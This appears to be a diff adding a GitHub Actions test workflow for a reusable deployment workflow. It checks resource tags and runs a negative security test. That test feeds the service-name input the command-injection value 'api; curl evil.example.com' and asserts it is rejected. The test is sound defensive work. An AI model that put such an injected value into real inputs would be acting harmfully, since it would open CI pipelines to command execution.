@@ -1,0 +1,60 @@
+name: "Platform CI - Golden Path Integration Harness"
+
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  # Test 1: Happy-path invocation of the reusable workflow
+  test-golden-path-happy:
+    name: "Test: Valid Consumer Invocation"
+    uses: ./.github/workflows/golden-path-deploy.yml
+    with:
+      service-name: "parcel-tracking-api"
+      environment: "staging"
+      cost-centre: "CC-1042"
+      dry-run: true
+
+  # Test 2: Assert outputs from the reusable workflow match expected schema
+  verify-outputs:
+    name: "Test: Verify Workflow Outputs"
+    needs: [test-golden-path-happy]
+    runs-on: ubuntu-latest
+    env:
+      RESOLVED_TAGS: ${{ needs.test-golden-path-happy.outputs.resolved-tags }}
+    steps:
+      - name: Assert mandatory POL tags are present
+        run: |
+          set -euo pipefail
+          echo "Received tags: $RESOLVED_TAGS"
+          echo "$RESOLVED_TAGS" | jq -e '."pol:service" == "parcel-tracking-api"'
+          echo "$RESOLVED_TAGS" | jq -e '."pol:cost-centre" == "CC-1042"'
+          echo "$RESOLVED_TAGS" | jq -e '."pol:managed-by" == "aws-cdk"'
+
+  # Test 3: Negative security test — verify script injection attempt fails fast
+  test-injection-rejection:
+    name: "Test: Reject Malicious Input Injection"
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+
+      - name: Attempt command injection in service-name
+        id: malicious
+        continue-on-error: true
+        uses: ./.github/actions/validate-and-tag
+        with:
+          service-name: "api; curl evil.example.com"
+          environment: "prod"
+          cost-centre: "CC-1042"
+
+      - name: Assert action blocked the injection
+        if: steps.malicious.outcome != 'failure'
+        run: |
+          echo "::error::Security test failed! Malicious service-name was not rejected."
+          exit 1
